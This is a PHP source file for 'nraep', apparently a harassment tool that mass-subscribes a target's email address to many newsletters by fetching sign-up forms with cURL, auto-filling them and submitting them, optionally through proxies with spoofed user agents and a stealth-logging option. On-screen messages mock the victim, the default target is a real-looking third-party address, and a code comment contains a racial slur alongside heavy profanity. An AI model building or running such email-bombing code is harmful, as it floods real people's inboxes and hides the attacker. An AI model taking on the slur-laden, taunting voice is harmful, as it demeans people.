<?php

/*
	nraep 0.5 - newsletter raep automation

		   by: hysterix
	      for who: a present for anon
		  why: because we like newsletters so much, we need to automate teh signup
		 what: Takes a list of sites that you have selected, and attempts to sign you up!
		 todo: see readme
*/

require_once('includes/config.php');

// header
echo '<html><head><script language="javascript" src="includes/utils.js"></script><link rel="stylesheet" href="css/yastyle.css"><title>nraep'.VERSION.' - '.TITLE.'</title></head><body>'."\n\n";

if(isset($_POST['second'])) { // second time through

	// defaults
	if(isset($_POST['name'])) {
		if(($_POST['name'] == '') || ($_POST['name'] == ' ')) {
	   		$output['name']  = "Ajazz Boktoo";	 // <-- asshole LOVES newsletters, no matter the subject :-)
    		} else {
		    $output['name'] = $_POST['name'];	// they actually entered something
     		}
	} else {
		$output['name']  = "Ajazz Boktoo";		 // <-- asshole LOVES newsletters, no matter the subject :-)
	}

	if(isset($_POST['email'])) {
	  	if(($_POST['email'] == '') || ($_POST['email'] == ' ')) {
	   		$output['email']  = "comeseeindia@hotmail.com";	 // <-- asshole LOVES newsletters, no matter the subject :-)
     	  	} else {
		    $output['email'] = $_POST['email'];	// they actually entered something
      	  	}
  	} else {
		$output['email']  = "comeseeindia@hotmail.com";	 // <-- asshole LOVES newsletters, no matter the subject :-)
	}


	if(isset($_POST['maxconnects'])) {
		$maxConnects = $_POST['maxconnects'];	
	} else {
		$maxConnects  = MAX_CONNECTIONS;
	}

	if($maxConnects < 1) {
		echo "Can't choose less than one max connection!<br /><h1 class='alert'>You fail!</h1>";
		$maxConnects = 1;
	} elseif($maxConnects > 100) {
		echo "Too many connections!<br /><h1 class='alert'>You fail!</h1>";
		$maxConnects = 10;
	}

	if(isset($_POST['proxyq'])) { // they want to connect with proxy
		if(strlen($_POST['knownproxy']) > 4) { // they are using a known proxy
			$proxyvar = $_POST['knownproxy'];  // im not going to do error checking; get it right, or pay the price
		} else {
			$proxyvar = 1;	      // 1 means connect with new proxy
		}
	}
	else { // default is no
		$proxyvar = 0;
	}	

	echo '<div class="main">';
	echo '<div class="title"><div class="largefont">nraep v'.VERSION.'</div></h2>';
	echo '<div class="logo" />by: hysterix&nbsp;&nbsp;<img src="images/logo-small.png" alt="skull" height="193" width="200" /></div></div>';
	echo '<div id="loader" class="loader"><h3>';

	$rnum = rand(0,6);

	switch($rnum) {
		case 0:
			echo $output['email'].' is goin\' get raepd!';
			break;
		case 1:
			echo 'What did '.$output['email'].' do to you anyways?';
			break;
		case 2:
			echo 'I think '.$output['email'].' should check their email.';
			break;
		case 3:
			echo 'Yo dawg, we herd '.$output['email'].' lieks emails, so we are sending a fuckton of emails to their email!';
			break;
		case 4:
			echo 'The partyvan has been alerted to your spamming; '.$output['email'].' lol\'d. ;-)';
			break;
		case 5:
			echo $output['email']. ' is most certainly the man now dog.';
			break;
		case 6:
			echo 'So I says to '.$output['email'].', I says...';
			break;

		default:
			echo $output['email'].' has been nraepd!';
	}	

	echo '</h3><img src="images/loader.gif" alt="loader" /><br /><br />';
	echo '<div id="successnum" class="successnum succeed resulttype"></div><br /><div id="failurenum" class="failurenum alert resulttype"></div>';

	$ipToLog   = retIpToLog();		       // the ip address of the "from" for logging
	$listcount = count($siteList); 		       // needed multiple times
	$numcon    = floor($listcount / $maxConnects); // main loop counter
	$numremain = $listcount % $maxConnects;	       // the remainder to be done (not implemented yet)
	//echo "loop count is: $numcon, number per shot: $maxConnects, with $numremain at the end, site total: $listcount";exit;

	$arrError   = array();
	$arrSuccess = array();
	$cntError   = 0; // error counter
	$cntSuccess = 0; // success counter
	$w = 0; 	 // counter
	for($i=0; $i<$numcon; $i++) { 	// here be dragons
		$connectlist = array();
		$curl = new CURL();  // create the curl instance
		for($j=0; $j<$maxConnects; $j++) {
			$opts = setBrowser($proxyvar,0,$header,$userAgentString);  // set browser information

			$connectlist[$j][0] = $siteList[$w]; // load the url into connectlist

			if(isset($opts[1])) {
				$connectlist[$j][1] = $opts[1]; // load the userAgent used into $connect list
			}
			if(isset($opts[2])) {
				$connectlist[$j][2] = $opts[2]; // load the proxy used into $connectlist if any			
			}
			$curl->retry = MAX_RETRYS;
			$curl->addSession( $siteList[$w], $opts[0] );
			$w++;	
		}
		ob_start();	// this is a hack if i've ever seen one
		$result = $curl->exec();  // this is an array of all the sites returned
		ob_end_clean(); // without this, php likes to output a 1 to the screen (something to do with the header info probably)
		// unset curl 		
		$curl->clear();  // remove the curl instance
		unset($curl);
		
		/* TIDY SAVAGED OUR WOMENS */
		// cycle through the curl result set
		// tidy up the html and then remove
		// this saves some resources
		// ******** this bullshit was a good idea at the time ******** 
		// ******** until i couldnt figure out why some forms tags were totally empty.... ******** 
		// ******** playing with tidy config yielded nothing ******** 
		// ******** offending function: cleanRepair(); occasionally savaged form tags ******** 
		/*
		for($a=0; $a<count($result); $a++) {
			// create new tidy instance
			$tidy = new tidy();  // clean up the tag soup returned
			// tidy gets upset if you pass it an array 
			if(is_array($result[$a])) { // put all elements into string and pass along
				$tmpval = '';
				foreach($result[$a] as $elsite) {
					$tmpval .= $elsite;
				}
				$result[$a] = $tmpval;
				unset($tmpval);
			}
			$tidy->parseString($result[$a],$tidy_config);
			$tidy->cleanRepair();
			$tidy = (string)$tidy; // cast to string; we dont need errors and other crap 
			echo $tidy;exit;
			$siteset[$a] = $tidy;
			unset($tidy);
		}
		
		unset($result); // free up memory
		*/
		for($b=0; $b<count($result); $b++) {
			$arrUrl	      = array();
			$arrInput     = array();
			$arrSelect    = array();
			$x	      = 0; // our counters
			$y	      = 0;
			if(is_array($result[$b])) { // put all elements into string and pass along
				// flatten array before sending along
				$result[$b] = $results[$b][0].$result[$b][1];
			}

			$html = str_get_html($result[$b]);
			
			foreach($html->find('form') as $f)  {// find all form elements, then find all inputs inside the form elements.
				$arrUrl[$x][0] = $f->action; // the url
				$arrUrl[$x][1] = $f->method; // the method, get or post
				foreach($f->find('input') as $z) {
					// if we got this far, we know the connection worked; if we used a proxy for the first time, we should cache it
					if(isset($connectlist[$b][2])) {
						$_SESSION['goodproxy'] = $connectlist[$b][2];
					}
					$arrInput[$x][$y]['name']    = $z->name; 
					$arrInput[$x][$y]['type']    = $z->type;       // button checkbox file hidden image password radio reset submit text
					$arrInput[$x][$y]['value']   = $z->value;      // whatever is pre-entered into the box upon page load
					if(isset($z->checked)) {
						$arrInput[$x][$y]['checked'] = $z->checked; // whether or not the checkbox or radio button is preselected
					} 
					$y++;
				}

				foreach($f->find('select') as $s) {
					if(strpos($s->name,"]")) { // array, remove key
						$firstopenbracketpos = strripos($s->name,"[");
						$lastendbracketpos   = strripos($s->name,"]");
						$thename = substr($s->name,$firstopenbracketpos,$lastendbracketpos);
						$thename = trim($thename,"[]");
						$arrSelect[$x][$y]['name'] = $thename;		
					} else {
						$arrSelect[$x][$y]['name']  = $s->name; 
					}

					$fuckityo = false; // pick the second choice for ever select menu
					$notagain = false;
					foreach($s->find('option') as $o) {
						if($fuckityo) { 
							if(!$notagain) {
								$arrSelect[$x][$y]['value']   = $o->innertext; // lets not scan through shit
								$notagain = true;
							// instead, lets just always select the second option in the list and call it a day <- good idea
							}
						}
						$fuckityo = true;
					}
					$y++;
				}
				$x++;
			}
  
	  		$html->clear(); // if you dont include these two statements, the damn
	  		unset($html);	// simple html dom becomes simple memory leaker 2.0 because
	  		unset($x,$y);   // of a fucking "php5 circular references memory leak" - nigger tits

	    		$arrPost = retPost($arrUrl,$arrInput,$arrSelect,$output,FORM_TYPE); // returns an array with key names url, method, and post
	    		if((ENABLE_LOG == true) && (DEBUG_LEVEL == 1)) {  // verbose mode
	    			ob_start();
	    			echo "Dumping arrUrl:\n";
	    			print_r($arrUrl);
	    			echo "Dumping arrInput:\n";
	    			print_r($arrInput);
	    			echo "\n";
	    			echo "Memory usage: ".memory_get_usage()."\n";
	    			$yavar = ob_get_contents();
	    			ob_end_clean(); 
	    			$time2 = date("Y.m.d");
	    			$ourFileName = LOG_PATH.$time2.".log";
	    			if(fopen($ourFileName, 'a+')) {
	    				$ourFileHandle = fopen($ourFileName, 'a+');
	    				fwrite($ourFileHandle,$yavar);
	    				fclose($ourFileHandle);
	    			} else {
	    				echo "Failed to open log!";
	    			}
	    		}
	    		unset($arrUrl); 
	    		unset($arrInput);
	    		unset($html);
	      		
	    		$ogUrl      = split_url($connectlist[$b][0]); 
	    		$postingUrl = split_url($arrPost['url']);
		  
	    		if(isset($postingUrl['scheme'])) { // path absolute, use as-is
	      			$urlToPost = $arrPost['url'];
	    		} else { // no host, path relative, slap this on the back of the original url; great success!
	    			$newpath = str_replace_once("/","",$postingUrl['path']); // remove the leading slash if it exists
	    			$urlToPost = $ogUrl['scheme']."://".$ogUrl['host']."/".$newpath;
	    		}

	    		if($arrPost == 1) {  // error
	    			$cntError++;
	    		} else {
				if(isset($connectlist[$b][1])) { // use previously used user agent
					$agent = $connectlist[$b][1];
				} else {
					$agent = $userAgentString;  // this should never be their first connect
				}
	    			if(!empty($connectlist[$b][2])) { 	    // re-use proxy originally used
					if(isset($_SESSION['goodproxy'])) { // re-use from proxy cache if it exists
						$proxyvar = $_SESSION['goodproxy'];
					} else {
	    					$proxyvar = $connectlist[$b][2];
					}
	    			}

	    			if(strcasecmp($arrPost['method'],"post") == 0 ) { // need to post to site
	    				$opts2 = setBrowser($proxyvar,$arrPost['post'],$header,$agent);  // set browser information
	    				$cntSuccess++;
	    			}
	    		  	elseif(strcasecmp($arrPost['method'],"get") == 0 ) { // need to get to site
	    				$opts2 = setBrowser($proxyvar,1,$header,$agent);  // set browser information
	    				$urlToPost = $urlToPost."?".$arrPost['post'];
	    				$cntSuccess++;
	    			}
	      
	      		$curl2 = new CURL();  
	      		$curl2->retry = MAX_RETRYS;  
	      		$curl2->addSession( $urlToPost, $opts2[0] );  //grab the site
			ob_start();	// this is a hack if i've ever seen one
			$result2 = $curl2->exec();
			ob_end_clean(); // without this, php likes to output a 1 to the screen (something to do with the header info probably  		
	      		$time = date("c");
	      		$curl2->clear();
	      		unset($curl2);
	      
	      		//echo "<br />result:<br />";
	      		//print_r($result2);  // server response

	      		// do they want logging?
	      		if(ENABLE_LOG == true) {
	      			if((DEBUG_LEVEL == 0) || (DEBUG_LEVEL == 1)) {
	      				// begin logging
	      				$log_data  = " - Connection Attempt -\n  Time:       $time:\n";
	      				$log_data .= "  Url:        ".$connectlist[$b][0]."\n";
	      				$log_data .= "  Action:     ".$arrPost['url']."\n";
	      				$log_data .= "  Sent to:    ".$urlToPost."\n";

					if(ENABLE_STEALTH_LOG == false) { // log the ip's of users
		      				if($proxyvar != 0) { // $proxyvar holds the proxy used originally
		      					$log_data .= "  Origin:     ".$proxyvar."\n";
		      				} else {
		      	
		      					$log_data .= "  Origin:     ".$ipToLog."\n";
		      				}
					}
	      				$log_data .= "  Data:       ".$arrPost['method']." ".$arrPost['post']."\n\n";
	      
	      				if(DEBUG_LEVEL == 1) { //verbose level
	      					ob_start();
	      					echo "Dumping curl browser options:\n";
	      					print_r($opts2);
	      					echo "\n";
	      					$log_data .= ob_get_contents();
	      					ob_end_clean(); 
	      				}
	      	
	      				$time2 = date("Y.m.d");
	      				$ourFileName = LOG_PATH.$time2.".log";
	      				if(fopen($ourFileName, 'a+')) {
	      					$ourFileHandle = fopen($ourFileName, 'a+');
	      					fwrite($ourFileHandle,$log_data);
	      					fclose($ourFileHandle);
	      				} else {
	      					echo "Failed to open log!";
	      				}
	      			}

				// fancy tricks to get the html to update all pretty
				echo '<script type="text/javascript">
					document.getElementById(\'successnum\').innerHTML = \''.$cntSuccess.' successful\';'."\n".'
					document.getElementById(\'failurenum\').innerHTML = \''.$cntError.' errors\';';
				echo '</script>';
				ob_flush();
				flush();
	      		}
    			unset($result2);
		}
  		  unset($arrPost);
	}		
		unset($result,$connectlist);
	}

	echo '<script type="text/javascript">
		document.getElementById(\'successnum\').innerHTML = \'\';'."\n".'
		document.getElementById(\'failurenum\').innerHTML = \'\';'."\n".'
		document.getElementById(\'loader\').innerHTML = \'\';';
	echo '</script>';
	ob_flush();
	flush();

	if($cntSuccess > $cntError) { // posting better than a 50% ratio
		echo '<h1>You have won the game!</h1>';
	} else {
		echo '<h1>You have lost the game!</h1>';
	}
	
	if($cntSuccess >= 1) { // some succeeded
		echo "<div class='successnum succeed resulttype'>There were $cntSuccess successes!</div><br />";	
	}

	if($cntError >= 1) { // some may have failed
		echo "<div class='failurenum alert resulttype'>There were $cntError failures!</div><br />";	
	}

	// do they want logging?
	if(ENABLE_LOG == true) {
		echo '<br /><h3>See logs for details: <a href="'.$ourFileName.'">'.$time.'</a></h3>';
	}

	if(isset($_SESSION['goodproxy'])) {
		echo "<h3>Proxy: {$_SESSION['goodproxy']} works well.  Reuse? <br />";
		echo "<br /><h2><input type='submit' value='Reuse good proxy' onclick='location.href=\"index.php?proxy={$_SESSION['goodproxy']}&simcon={$maxConnects}\"' /></h2>";
	unset($_SESSION['goodproxy']); // nuke proxy
	} else {
		echo "<br /><h2><input type='submit' value='Raep again' onclick='location.href=\"index.php?simcon={$maxConnects}\"' /></h2>";
	}
}
else { // first time loading the page, or clicked re-use proxy button
	echo '<div class="main">';
	echo '<div class="title"><div class="largefont">nraep v'.VERSION.'</div></h2>';
	echo '<div class="logo" />by: hysterix&nbsp;&nbsp;<img src="images/logo-small.png" alt="skull" height="193" width="200" /></div></div>';
	echo '<div class="mainform"><form name="newsletters" action="'."{$_SERVER['PHP_SELF']}".'" method="post">
		<table cellspacing="3" cellpadding="1" border="0">
			<tr><td>Masquerade configuration:</td></tr>
			<tr>
				<td>&nbsp;</td><td><table class="cssfun" cellspacing="1" cellpadding="1" border="0">
					<tr>
						<td>Name:</td><td><input type="text" size="12" maxlength="150" name="name" /></td>
					</tr>
					<tr>
						<td>Email:</td><td><input type="text" size="12" maxlength="150" name="email" /></td>
					</tr>
				</table></td>
			</tr>
			
			<tr><td>&nbsp;</td></tr>
			<tr><td>Connection configuration:</td></tr>
			<tr>
				<td>&nbsp;</td><td><table class="cssfun" cellspacing="1" cellpadding="1" border="0">
					<tr>
						<td>Simultaneous&nbsp;&nbsp;&nbsp;<br /> connections:</td><td><input type="text" size="1" 							maxlength="10" name="maxconnects" value="';
						if(isset($_REQUEST['simcon'])) {
							echo $_REQUEST['simcon']; // they went through once before; use previous num
						} else {
							echo MAX_CONNECTIONS;	  // first time through
						}
						echo '" /></td>
					</tr>
					<tr>
						<td>Use proxy?</td><td><input type="checkbox" name="proxyq" ';
							if(isset($_REQUEST['proxy'])) // proxy cache exists, pre check
								echo 'checked=checked ';
						echo ' onclick="proxyfun();" /><span id="injectmsg"></span></span></td>
					</tr>
					<tr>
						<td>Manual proxy?</td><td>
						<input type="text" name="knownproxy" size="12" maxlength="100" ';
							if(isset($_REQUEST['proxy']))  { // proxy cache exists, insert
								echo 'value="'.$_REQUEST['proxy'].'" ';					
							} else {
								echo ' disabled="disabled" ';
							}
						echo ' /></span><br />ip:port</td></tr>
						</table></td>
				</tr>
			
			 
			<tr>
				<td></td><td><br /><input id="raepist" type="submit" value="Raep" onclick="javascript:document.getElementById(\'raepist\').disabled=true"/></td>
			</tr>
		<input type="hidden" name="second" value="1" />
		
	       </form></div>';
	echo '</div>';

}


// footer
echo '</body></html>';

?>
